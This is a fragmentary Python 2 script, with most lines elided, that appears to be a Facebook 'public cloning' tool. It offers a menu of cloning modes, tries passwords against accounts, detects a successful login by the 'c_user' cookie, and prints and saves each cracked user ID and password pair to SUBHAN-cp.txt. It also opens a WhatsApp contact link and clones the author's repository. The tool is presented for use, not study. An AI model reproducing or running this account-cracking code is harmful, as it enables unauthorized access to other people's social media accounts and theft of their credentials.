...
def main_apv():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+923105194032')
...
def main_input():
    ...
    if mx == '1':
        ...
        os.system('git clone https://github.com/SubhanXKhan/KHAN-XD')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[SUBHAN-CP] ' + coc + user + ' | ' + pass1
...
def fb_menu():
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;92m[1] Public Cloning  [SUBHANPro]'
    print '\x1b[1;92m[2] Public Cloning  [SUBHANFast]'
    print '\x1b[1;91m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning SUBHANPro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning SUBHANFast ]'
        print ''
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    ...
                                    print '\x1b[1;97m[SUBHAN-CP] ' + uid + ' | ' + pass6
                                    cp = open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
